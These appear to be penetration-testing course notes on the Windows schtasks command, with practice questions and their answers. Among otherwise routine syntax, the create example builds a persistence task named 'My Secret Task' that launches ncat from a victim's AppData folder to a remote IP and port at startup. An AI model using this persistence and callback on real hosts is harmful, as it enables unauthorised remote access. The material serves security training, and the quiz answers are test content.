### Using `schtasks` for Task Management

**Scheduled tasks** are a powerful feature for automating actions in Windows. From an administrative perspective, this includes both managing routine tasks and setting up persistence mechanisms. Here’s a detailed guide on how to use the `schtasks` command for these purposes:

#### Display Scheduled Tasks

To view existing scheduled tasks, use the following syntax:

- **Query Syntax**:
    - `schtasks /query /fo <format> /v /nh /s <host> /u <user> /p <password>`
        
    - **`/fo <format>`**: Specifies the format of the output. Options include `TABLE`, `LIST`, and `CSV`.
        
    - **`/v`**: Provides detailed information about the tasks.
        
    - **`/nh`**: Omits column headers in the output.
        
    - **`/s <host>`**: Connects to a remote host. Default is `localhost`.
        
    - **`/u <user>`**: Runs the command under the specified user account.
        
    - **`/p <password>`**: Provides the password for the user account.
        
    - **Example**:
        
        - `schtasks /query /fo list /v`

#### Create a New Scheduled Task

To create a new scheduled task, use:

- **Create Syntax**:
    - `schtasks /create /sc <schedule> /tn <task_name> /tr <task_run> /s <host> /u <user> /p <password> /mo <modifier> /rl <level> /z`
        
    - **`/sc <schedule>`**: Sets the schedule type (e.g., `ONSTART`, `DAILY`, `WEEKLY`).
        
    - **`/tn <task_name>`**: Names the task.
        
    - **`/tr <task_run>`**: Defines the command or executable to run.
        
    - **`/s <host>`**: Specifies the host.
        
    - **`/u <user>`**: Specifies the user account under which to run the task.
        
    - **`/p <password>`**: Provides the password for the user account.
        
    - **`/mo <modifier>`**: Sets modifiers for the schedule (e.g., every 5 hours).
        
    - **`/rl <level>`**: Specifies the privilege level (e.g., `LIMITED`, `HIGHEST`).
        
    - **`/z`**: Deletes the task after completion.
        
    - **Example**:
        
        - `schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100"`

#### Change the Properties of a Scheduled Task

To modify an existing task:

- **Change Syntax**:
    - `schtasks /change /tn <task_name> /tr <new_task_run> /ENABLE /DISABLE /ru <user> /rp <password>`
        
    - **`/tn <task_name>`**: Specifies the task to change.
        
    - **`/tr <new_task_run>`**: Modifies the action of the task.
        
    - **`/ENABLE`**: Enables the task.
        
    - **`/DISABLE`**: Disables the task.
        
    - **`/ru <user>`**: Sets the user account to run the task.
        
    - **`/rp <password>`**: Provides the password for the user account.
        
    - **Example**:
        
        - `schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"`

#### Delete a Scheduled Task

To remove a scheduled task:

- **Delete Syntax**:
    - `schtasks /delete /tn <task_name> /s <host> /u <user> /p <password> /f`
        
    - **`/tn <task_name>`**: Specifies the task to delete.
        
    - **`/s <host>`**: Specifies the host.
        
    - **`/u <user>`**: Specifies the user account.
        
    - **`/p <password>`**: Provides the password.
        
    - **`/f`**: Forces deletion without confirmation.
        
    - **Example**:
        
        - `schtasks /delete /tn "My Secret Task" /f`

### Practice Tasks

1. **True or False**: Can a scheduled task be set to run when a user logs onto a host?
2. **Practical Exercise**: Access the target host and practice creating, modifying, and deleting scheduled tasks. Type `COMPLETE` when done.

### Questions:
- True or False: A scheduled task can be set to run when a user logs onto a host?
	- True
- Access the target host and take some time to practice working with Scheduled Tasks. Type COMPLETE as the answer when you are ready to move on.
	- Complete